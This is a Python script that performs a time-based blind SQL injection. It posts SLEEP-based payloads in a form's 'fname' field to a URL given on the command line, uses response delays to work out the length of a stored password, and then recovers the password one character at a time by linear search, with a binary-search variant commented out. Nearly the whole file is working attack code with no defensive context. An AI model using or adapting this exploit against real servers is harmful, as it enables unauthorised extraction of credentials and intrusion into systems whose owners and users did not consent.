from codecs import ascii_decode
from re import S
from time import sleep
import requests
import argparse
from os import sys
from typing import Dict

def parse_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",  help="Remote URL", type=str, dest="url")
    
    args = parser.parse_args()
    
    url:str = args.url
    
    if url is None or url == "":
        print("URL PARAMETER NOT PROVIDED")
        sys.exit(-1)
    
    return url

def make_request(url:str, 
                 data:Dict[str,str], 
                 timeout=10):
    ret_val:bool = False
    try:
        response:requests.Response = requests.post(url=url, data=data, timeout=timeout)
        
        if response.status_code != 200:
            return False
    except:
        ret_val = True
        sleep(1.1)
    
    return ret_val

def determine_password_length(url:str, timeout=10):
    
    data = {}
    sleep:int = timeout + 1
    for i in range(0,100):
        data['fname'] = f"root\' AND IF((SELECT char_length(password)) = {i}, SLEEP({sleep}),NULL)-- "
        print(f"Attempting password length: {i}")
        if make_request(url, data, timeout):
            print(f"PASSWORD LENGTH FOUND!! ({i})")
            return i

    return -1

def determine_password_request(url:str, 
                               timeout:int,
                               len:int, 
                               char_code:int, 
                               sleep:int,
                               operator:str):
    data = {}
    data['fname'] = f"root\' AND IF((SELECT ascii(substr(password,{len},1))) {operator} {char_code}, SLEEP({sleep}),NULL)-- "
    print(f"Attempting to see if ascii-code={char_code}) is '{operator}' than the unknown character at position {len}")
    return make_request(url, data, timeout)


def linear_search_determine_password(url:str, password_len:int, timeout=10):
    sleep:int = timeout + 1
    password:str = ""
    for len in range(1, password_len + 1):
        for char_code in range(33, 126):
            if determine_password_request(url, timeout, len, char_code, sleep, "="):
                print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
                password += chr(char_code)
                print("PASSWORD: " + password)
                break
    return password


def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
    
    def binary_search_determine_character(url:str, len:int, timeout=10):
        
        print(f"Starting binary search for postion {len}")
        low = 33
        high = 126
        mid = 0
        sleep = timeout + 1
    
        while low <= high:
    
            mid = (high + low) // 2
    
            if determine_password_request(url=url, 
                                        timeout=timeout, 
                                        len=len, 
                                        char_code=mid, 
                                        sleep=sleep,
                                        operator=">"):
                low = mid + 1
    
            elif determine_password_request(url=url, 
                                        timeout=timeout, 
                                        len=len, 
                                        char_code=mid, 
                                        sleep=sleep,
                                        operator="<"):
                high = mid - 1
    
            else:
                return mid
        
        return None
    
    password = ""
    for len in range(1, password_len + 1):
        char_code = binary_search_determine_character(url, len, timeout)
        
        if char_code is None:
            print("FAILED TO FIND PASSWORD")
            return None
        
        print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
        password += chr(char_code)
        print("PASSWORD: " + password)
    return password

url:str = parse_args()
timeout = 3
password   = linear_search_determine_password(url=url, password_len=determine_password_length(url, timeout), timeout=timeout)
# password = binary_search_determine_password(url=url, password_len=determine_password_length(url=url, timeout=timeout), timeout=timeout)